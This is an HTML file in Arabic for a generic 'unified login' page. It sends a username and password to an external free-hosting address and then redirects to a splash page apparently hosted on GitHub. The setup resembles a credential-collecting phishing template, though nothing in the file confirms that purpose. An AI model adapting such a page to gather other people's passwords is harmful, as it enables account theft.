<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تسجيل الدخول الموحد</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background-color: #007bff; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        button:hover { background-color: #0056b3; }
    </style>
</head>
<body>

<div class="login-container">
    <h2>تسجيل الدخول</h2>
    
    <!-- 🌟 [تعديل أساسي]: استبدل الرابط أدناه برابط موقعك الفعلي على InfinityFree -->
    <form action="https://infinityfreeapp.com" method="POST" id="mainForm">
        
        <!-- الحقول المخفية لتحديد صفحة التوجيه القادمة على GitHub -->
        <input type="hidden" name="next_page" value="splash.html">

        <input type="text" name="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
        <input type="password" name="password" placeholder="كلمة المرور" required>
        
        <button type="submit">دخول</button>
    </form>
</div>

</body>
</html>
